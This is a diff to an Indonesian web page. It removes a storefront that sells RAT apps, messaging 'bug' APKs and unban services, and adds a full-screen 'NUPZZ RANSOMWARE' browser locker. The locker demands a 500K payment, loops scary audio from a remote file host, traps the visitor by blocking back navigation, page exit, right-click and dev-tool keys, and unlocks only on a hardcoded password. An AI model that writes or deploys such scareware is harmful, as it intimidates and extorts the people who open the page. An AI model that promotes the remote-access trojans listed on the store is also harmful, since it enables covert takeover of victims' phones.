@@ -2,191 +2,498 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GALZMODX - Official Store</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔒 NUPZZ RANSOMWARE</title>
     <style>
+        /* ===== RESET & LOCK ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
         body {
-            font-family: 'Poppins', sans-serif;
-            background-color: #000000;
-            color: #ffffff;
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: 999999;
             margin: 0;
-            padding: 0;
         }
-        .glass-card {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(168, 85, 247, 0.3);
-            border-radius: 16px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        
+        /* ===== LAYAR LOCK TOTAL ===== */
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: radial-gradient(ellipse at center, #1a0000 0%, #000000 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999999;
+            animation: pulse 2s infinite;
+            cursor: default;
         }
-        .glass-card:active {
-            transform: scale(0.95);
-            border-color: #22c55e;
+        
+        @keyframes pulse {
+            0%, 100% { background: radial-gradient(ellipse at center, #1a0000 0%, #000000 100%); }
+            50% { background: radial-gradient(ellipse at center, #2a0000 0%, #000000 100%); }
         }
-        .btn-order {
-            background: linear-gradient(135deg, #a855f7 0%, #22c55e 100%);
-            color: black;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.2s;
+        
+        .container {
+            text-align: center;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            animation: glow 3s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            0% { text-shadow: 0 0 10px rgba(255, 0, 0, 0.3); }
+            100% { text-shadow: 0 0 40px rgba(255, 0, 0, 0.8); }
+        }
+        
+        /* ===== FOTO PROFILE ===== */
+        .profile-pic {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 4px solid #ff0000;
+            margin: 0 auto 20px;
+            overflow: hidden;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            animation: rotateBorder 4s linear infinite;
+        }
+        
+        @keyframes rotateBorder {
+            0% { border-color: #ff0000; }
+            25% { border-color: #ff6600; }
+            50% { border-color: #ff0000; }
+            75% { border-color: #cc0000; }
+            100% { border-color: #ff0000; }
+        }
+        
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        /* ===== TITLE ===== */
+        .title {
+            font-size: 3em;
+            font-weight: 900;
+            color: #ff0000;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.6);
+            margin-bottom: 10px;
+            animation: shake 0.5s infinite;
+            letter-spacing: 5px;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        .sub-title {
+            color: rgba(255, 0, 0, 0.5);
+            font-size: 0.9em;
+            letter-spacing: 8px;
+            margin-bottom: 15px;
+        }
+        
+        /* ===== THREAT MESSAGE ===== */
+        .threat {
+            font-size: 1.3em;
+            color: #ff3333;
+            background: rgba(255, 0, 0, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            margin: 20px 0;
+            font-weight: bold;
+            line-height: 1.8;
+            animation: blinkText 1.5s infinite;
+        }
+        
+        @keyframes blinkText {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        
+        /* ===== INPUT ===== */
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .input-group input {
+            padding: 18px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 0, 0, 0.3);
+            border-radius: 12px;
+            color: #ff0000;
+            font-size: 1.2em;
+            text-align: center;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            transition: all 0.3s;
+            letter-spacing: 5px;
+        }
+        
+        .input-group input:focus {
+            border-color: #ff0000;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
+            background: rgba(255, 0, 0, 0.05);
+        }
+        
+        .input-group input::placeholder {
+            color: rgba(255, 0, 0, 0.3);
+            letter-spacing: 2px;
+        }
+        
+        .input-group button {
+            padding: 18px;
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1.3em;
+            font-weight: 900;
             cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+            letter-spacing: 3px;
         }
-        .btn-order:hover {
-            box-shadow: 0 0 15px rgba(34, 197, 94, 0.4);
+        
+        .input-group button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.4);
         }
-        .free-card {
-            border: 1px dashed rgba(34, 197, 94, 0.5);
+        
+        .input-group button:active {
+            transform: scale(0.95);
         }
+        
+        /* ===== ERROR & COUNTER ===== */
+        .error-msg {
+            color: #ff4444;
+            font-size: 0.9em;
+            margin-top: 10px;
+            min-height: 30px;
+            animation: shake 0.3s infinite;
+        }
+        
+        .counter {
+            color: rgba(255, 0, 0, 0.3);
+            font-size: 0.8em;
+            margin-top: 15px;
+            letter-spacing: 2px;
+        }
+        
+        /* ===== GLITCH EFFECT ===== */
+        .glitch {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, rgba(255,0,0,0.03) 0px, rgba(255,0,0,0.03) 2px, transparent 2px, transparent 4px);
+            z-index: 99999999;
+            animation: glitchEffect 0.1s infinite;
+        }
+        
+        @keyframes glitchEffect {
+            0% { opacity: 0.2; }
+            50% { opacity: 0.5; }
+            100% { opacity: 0.2; }
+        }
+        
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 600px) {
+            .title { font-size: 2.2em; }
+            .threat { font-size: 1em; padding: 12px; }
+            .profile-pic { width: 120px; height: 120px; }
+        }
+        
+        /* ===== HIDE SCROLLBAR ===== */
+        ::-webkit-scrollbar { display: none; }
+        ::selection { background: transparent; }
+        ::-moz-selection { background: transparent; }
     </style>
 </head>
-<body class="pb-20">
-
-    <!-- Header / Banner Area -->
-    <div class="max-w-xl mx-auto px-4 pt-6">
-        <div class="rounded-2xl overflow-hidden shadow-[0_0_30px_rgba(168,85,247,0.2)] mb-8 border border-purple-500/30">
-            <img src="b1c41db7-9902-4fa5-90e1-0f2df8cad74b.png" alt="GALZMODX Logo" class="w-full h-auto" onerror="this.src='https://placehold.co/600x400/000/a855f7?text=GALZMODX'">
-        </div>
-
-        <div class="text-center mb-10">
-            <h1 class="text-4xl font-black mb-1 text-white tracking-tight">GALZMODX</h1>
-            <p class="text-lg font-bold text-green-500 tracking-widest uppercase">GALZ IS GOOD</p>
-        </div>
-
-        <!-- JUAL SECTION -->
-        <div class="space-y-4">
-            <h2 class="text-xl font-extrabold text-purple-400 mb-4 flex items-center">
-                <span class="mr-2 px-2 py-0.5 bg-purple-600 text-black rounded text-sm uppercase italic">JUAL</span>
-                APK & SERVICE
-            </h2>
-
-            <!-- Item: APK BUG SEMUA ADA -->
-            <div class="glass-card p-5">
-                <h3 class="text-lg font-bold text-white mb-1">APK BUG SEMUA ADA</h3>
-                <p class="text-xs text-gray-400 mb-4">Akses lengkap semua fitur bugging premium.</p>
-                <button onclick="kirimPesan('ASSALAMUALAIKUM BANG ORDER APK BUG DONG (NAMA APK BUG)')" class="btn-order w-full py-3 rounded-xl shadow-lg">ORDER SEKARANG</button>
+<body>
+    <!-- LAYAR LOCK -->
+    <div class="lock-screen" id="lockScreen">
+        <div class="container">
+            <!-- FOTO PROFILE -->
+            <div class="profile-pic">
+                <img src="https://files.catbox.moe/dv1xua.jpg" alt="NUPZZ" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22150%22%3E%3Crect fill=%22%23000%22 width=%22150%22 height=%22150%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23ff0000%22 font-size=%2240%22 font-family=%22monospace%22%3ENUPZZ%3C/text%3E%3C/svg%3E'">
             </div>
-
-            <!-- Item: MURBUG -->
-            <div class="glass-card p-5">
-                <h3 class="text-lg font-bold text-white mb-1">MURBUG</h3>
-                <p class="text-xs text-gray-400 mb-4">APK SIAP UPDATE (Paling Stabil)</p>
-                <button onclick="kirimPesan('ASSALAMUALAIKUM BANG ORDER MURBUG')" class="btn-order w-full py-3 rounded-xl">BELI MURBUG</button>
+            
+            <!-- TITLE -->
+            <div class="title">🔒 NUPZZ</div>
+            <div class="sub-title">• RANSOMWARE •</div>
+            
+            <!-- THREAT MESSAGE -->
+            <div class="threat">
+                YAH HP KAMU KENA LOCK BY NUPZZ<br>
+                KALO MAU KEMBALI BAYAR 500K WKWK🤣🤣🤣
             </div>
-
-            <!-- Item: MURBAND -->
-            <div class="glass-card p-5">
-                <h3 class="text-lg font-bold text-white mb-1">MURBAND</h3>
-                <p class="text-xs text-gray-400 mb-4">MT FRESH + APK BAND</p>
-                <button onclick="kirimPesan('ASSALAMUALAIKUM BANG ORDER MURBAND')" class="btn-order w-full py-3 rounded-xl">BELI MURBAND</button>
+            
+            <!-- INPUT PASSWORD -->
+            <div class="input-group">
+                <input type="password" id="passwordInput" placeholder="MASUKKAN PASSWORD" maxlength="10" autofocus>
+                <button id="unlockBtn" onclick="checkPassword()">🔓 UNLOCK</button>
             </div>
-
-            <!-- Item: MURUNBAND -->
-            <div class="glass-card p-5">
-                <h3 class="text-lg font-bold text-white mb-1">MURUNBAND</h3>
-                <p class="text-xs text-gray-400 mb-4">TEXT KEDIP + APK UNBAND</p>
-                <button onclick="kirimPesan('ASSALAMUALAIKUM BANG MAU ORDER MURUNBAND')" class="btn-order w-full py-3 rounded-xl">BELI MURUNBAND</button>
-            </div>
-
-            <!-- Item: APK SURXRAT -->
-            <div class="glass-card p-5">
-                <h3 class="text-lg font-bold text-white mb-1">APK SURXRAT</h3>
-                <p class="text-xs text-gray-400 mb-4">Versi terbaru APK SURXRAT</p>
-                <button onclick="kirimPesan('ASSALAMUALAIKUM BANG MAU ORDER APK SURXRAT')" class="btn-order w-full py-3 rounded-xl">BELI SURXRAT</button>
-            </div>
-
-            <!-- Item: APK AJMXRAT -->
-            <div class="glass-card p-5">
-                <h3 class="text-lg font-bold text-white mb-1">APK AJMXRAT</h3>
-                <p class="text-xs text-gray-400 mb-4">Versi terbaru APK AJMXRAT</p>
-                <button onclick="kirimPesan('ASSALAMUALAIKUM BANG MAU ORDER AJMXRAT')" class="btn-order w-full py-3 rounded-xl">BELI AJMXRAT</button>
-            </div>
-
-            <!-- Item: JASA UNBAND PERMANEN -->
-            <div class="glass-card p-5">
-                <h3 class="text-lg font-bold text-white mb-1 uppercase">Jasa Unband Permanen</h3>
-                <p class="text-xs text-gray-400 mb-4">Proses cepat, garansi tembus.</p>
-                <button onclick="kirimPesan('ASSALAMUALAIKUM BANG ORDER UNBAND PERMANEN TAPI BERAPA BANG?')" class="btn-order w-full py-3 rounded-xl">ORDER 5K-15K</button>
-            </div>
-
-            <!-- Item: WEB BUG GACOR -->
-            <div class="glass-card p-5 border-green-500/50">
-                <h3 class="text-lg font-bold text-green-400 mb-1">WEB BUG GACOR</h3>
-                <p class="text-xs text-gray-400 mb-4">TEMBUS BLOKIR ALL HANDPHONE</p>
-                <button onclick="kirimPesan('BANG ORDER TF KEMANA')" class="btn-order w-full py-3 rounded-xl">AMBIL WEB</button>
-            </div>
-        </div>
-
-        <!-- FREE SECTION -->
-        <div class="mt-12 space-y-4">
-            <h2 class="text-xl font-extrabold text-green-500 mb-4 flex items-center">
-                <span class="mr-2 px-2 py-0.5 bg-green-500 text-black rounded text-sm uppercase italic">FREE</span>
-                GIVEAWAY
-            </h2>
-
-            <div class="grid grid-cols-1 gap-3">
-                <div class="glass-card free-card p-4 flex justify-between items-center">
-                    <div>
-                        <p class="text-sm font-bold text-white uppercase">Unband Spam Kedip</p>
-                    </div>
-                    <button onclick="kirimPesan('assalamualaikum bang yang free masih ada,Abang nya siap?')" class="bg-white/10 px-4 py-2 rounded-lg text-xs font-bold hover:bg-white/20">KLAIM</button>
-                </div>
-                <div class="glass-card free-card p-4 flex justify-between items-center">
-                    <div>
-                        <p class="text-sm font-bold text-white uppercase">Bug (Sender No Sendiri)</p>
-                    </div>
-                    <button onclick="kirimPesan('assalamualaikum bang yang free masih ada,Abang nya siap?')" class="bg-white/10 px-4 py-2 rounded-lg text-xs font-bold hover:bg-white/20">KLAIM</button>
-                </div>
-                <div class="glass-card free-card p-4 flex justify-between items-center">
-                    <div>
-                        <p class="text-sm font-bold text-white uppercase">Nokos All Negara</p>
-                    </div>
-                    <button onclick="kirimPesan('assalamualaikum bang yang free masih ada,Abang nya siap?')" class="bg-white/10 px-4 py-2 rounded-lg text-xs font-bold hover:bg-white/20">KLAIM</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="mt-16 text-center">
-            <p class="text-2xl font-black italic text-white mb-6 uppercase tracking-tighter">GAS ORDER</p>
-            <a href="#" onclick="bukaTelegramDenganPesan('ASSALAMUALAIKUM BANG ADA APA AJA')" class="inline-block bg-[#229ED9] text-white px-10 py-4 rounded-full font-bold shadow-lg hover:bg-sky-500 transition-colors">
-                HUBUNGI ADMIN LANGSUNG
-            </a>
+            
+            <!-- ERROR MESSAGE -->
+            <div class="error-msg" id="errorMsg"></div>
+            
+            <!-- COUNTER -->
+            <div class="counter" id="counter">PERCOBAAN KE- 0</div>
         </div>
     </div>
+    
+    <!-- GLITCH EFFECT -->
+    <div class="glitch"></div>
 
     <script>
-        // Username Telegram yang dituju
-        const TELEGRAM_USERNAME = "GALZMODXZ";
-
-        // Fungsi untuk membuka chat Telegram dengan pesan (deep link tg://)
-        function kirimPesan(teks) {
-            const encodedText = encodeURIComponent(teks);
-            // Deep link Telegram: tg://resolve?domain=username&text=pesan
-            const tgDeepLink = `tg://resolve?domain=${TELEGRAM_USERNAME}&text=${encodedText}`;
-            // Fallback ke web jika deep link tidak berhasil
-            const webFallback = `https://t.me/${TELEGRAM_USERNAME}?text=${encodedText}`;
-            
-            // Coba buka deep link
-            window.location.href = tgDeepLink;
-            
-            // Jika dalam 500ms halaman masih di sini (deep link gagal), maka fallback ke web
-            setTimeout(() => {
-                window.location.href = webFallback;
-            }, 500);
+        // ==================== KONFIGURASI ====================
+        const PASSWORD = "6779";
+        let attempts = 0;
+        let isLocked = true;
+        let audioPlayed = false;
+        
+        // ==================== PLAY SOUND DARI URL ====================
+        function playSoundFromURL() {
+            try {
+                const audio = new Audio('https://files.catbox.moe/w3t82s.m4a');
+                audio.volume = 0.8;
+                audio.loop = true; // Repeat biar serem terus
+                audio.play().catch(() => {
+                    // Fallback kalo gagal load
+                    playScarySound();
+                });
+                
+                // Kalo suara gagal total, pake oscillator
+                setTimeout(() => {
+                    if (!audioPlayed) {
+                        playScarySound();
+                    }
+                }, 2000);
+                
+                audioPlayed = true;
+                return audio;
+            } catch (e) {
+                playScarySound();
+                return null;
+            }
         }
-
-        // Fungsi khusus untuk tombol "HUBUNGI ADMIN LANGSUNG" dengan pesan tertentu
-        function bukaTelegramDenganPesan(pesan) {
-            const encodedText = encodeURIComponent(pesan);
-            const tgDeepLink = `tg://resolve?domain=${TELEGRAM_USERNAME}&text=${encodedText}`;
-            const webFallback = `https://t.me/${TELEGRAM_USERNAME}?text=${encodedText}`;
-            window.location.href = tgDeepLink;
-            setTimeout(() => {
-                window.location.href = webFallback;
-            }, 500);
+        
+        // ==================== SUARA SEREM (FALLBACK) ====================
+        function playScarySound() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                
+                // Oscillator 1 - bass serem
+                const osc1 = audioCtx.createOscillator();
+                const gain1 = audioCtx.createGain();
+                osc1.connect(gain1);
+                gain1.connect(audioCtx.destination);
+                osc1.frequency.setValueAtTime(50, audioCtx.currentTime);
+                osc1.frequency.linearRampToValueAtTime(30, audioCtx.currentTime + 3);
+                osc1.type = 'sawtooth';
+                gain1.gain.setValueAtTime(0.3, audioCtx.currentTime);
+                gain1.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 4);
+                osc1.start();
+                osc1.stop(audioCtx.currentTime + 4);
+                
+                // Oscillator 2 - noise tinggi
+                setTimeout(() => {
+                    const osc2 = audioCtx.createOscillator();
+                    const gain2 = audioCtx.createGain();
+                    osc2.connect(gain2);
+                    gain2.connect(audioCtx.destination);
+                    osc2.frequency.setValueAtTime(120, audioCtx.currentTime);
+                    osc2.type = 'square';
+                    gain2.gain.setValueAtTime(0.15, audioCtx.currentTime);
+                    gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 2);
+                    osc2.start();
+                    osc2.stop(audioCtx.currentTime + 2);
+                }, 300);
+                
+            } catch (e) {
+                // Diam aja kalo gagal
+            }
         }
+        
+        // ==================== PLAY SOUND SAAT LOAD ====================
+        let soundInterval;
+        window.addEventListener('load', function() {
+            // Play sound dari URL
+            const audio = playSoundFromURL();
+            
+            // Ulang sound setiap 10 detik
+            soundInterval = setInterval(() => {
+                if (document.getElementById('lockScreen').style.display !== 'none') {
+                    playSoundFromURL();
+                }
+            }, 10000);
+            
+            // Fokus ke input
+            document.getElementById('passwordInput').focus();
+            
+            // Lock semua interaksi
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            // Block keyboard shortcuts
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                    (e.ctrlKey && e.key === 'U') ||
+                    e.key === 'Escape') {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+            
+            // Block touch
+            document.addEventListener('touchmove', function(e) {
+                e.preventDefault();
+            }, { passive: false });
+        });
+        
+        // ==================== CEK PASSWORD ====================
+        function checkPassword() {
+            const input = document.getElementById('passwordInput');
+            const errorMsg = document.getElementById('errorMsg');
+            const counter = document.getElementById('counter');
+            const password = input.value.trim();
+            
+            if (password === PASSWORD) {
+                // UNLOCK
+                errorMsg.style.color = '#00ff00';
+                errorMsg.textContent = '✅ AKSES DIBUKA! SELAMAT!';
+                
+                // Stop sound
+                if (soundInterval) {
+                    clearInterval(soundInterval);
+                }
+                
+                // Play sound sukses
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+                    osc.type = 'sine';
+                    gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 1.5);
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + 1.5);
+                } catch(e) {}
+                
+                // Unlock screen
+                setTimeout(() => {
+                    document.getElementById('lockScreen').style.display = 'none';
+                    document.querySelector('.glitch').style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                    document.body.style.position = 'relative';
+                    document.body.innerHTML = `
+                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#00ff00;font-family:'Courier New',monospace;text-align:center;padding:20px;">
+                            <div>
+                                <h1 style="font-size:3em;margin-bottom:20px;">✅ UNLOCKED</h1>
+                                <p style="font-size:1.5em;color:#00ff88;">Selamat! Kamu berhasil membuka lock.</p>
+                                <p style="color:#8899aa;margin-top:20px;">NUPZZ RANSOMWARE</p>
+                            </div>
+                        </div>
+                    `;
+                }, 1000);
+                
+            } else {
+                // PASSWORD SALAH
+                attempts++;
+                errorMsg.style.color = '#ff0000';
+                errorMsg.textContent = '❌ PASSWORD SALAH! COBA LAGI!';
+                counter.textContent = `PERCOBAAN KE- ${attempts}`;
+                
+                // Play sound error
+                try {
+                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    const osc = audioCtx.createOscillator();
+                    const gain = audioCtx.createGain();
+                    osc.connect(gain);
+                    gain.connect(audioCtx.destination);
+                    osc.frequency.setValueAtTime(200, audioCtx.currentTime);
+                    osc.type = 'square';
+                    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
+                    osc.start();
+                    osc.stop(audioCtx.currentTime + 0.5);
+                } catch(e) {}
+                
+                input.value = '';
+                input.focus();
+                
+                // Shake effect
+                const container = document.querySelector('.container');
+                container.style.animation = 'none';
+                setTimeout(() => {
+                    container.style.animation = 'shake 0.3s';
+                }, 10);
+                setTimeout(() => {
+                    container.style.animation = '';
+                }, 300);
+                
+                // Random scary sound
+                if (attempts % 3 === 0) {
+                    playSoundFromURL();
+                }
+            }
+        }
+        
+        // ==================== ENTER KEY ====================
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                checkPassword();
+            }
+        });
+        
+        // ==================== BLOCK NAVIGATION ====================
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            return '';
+        });
+        
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, location.href);
+        });
+        
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        console.log('%c🔒 NUPZZ RANSOMWARE', 'font-size:30px;color:red;font-weight:bold;');
+        console.log('%cPassword: 6779', 'font-size:20px;color:yellow;');
     </script>
 </body>
 </html>
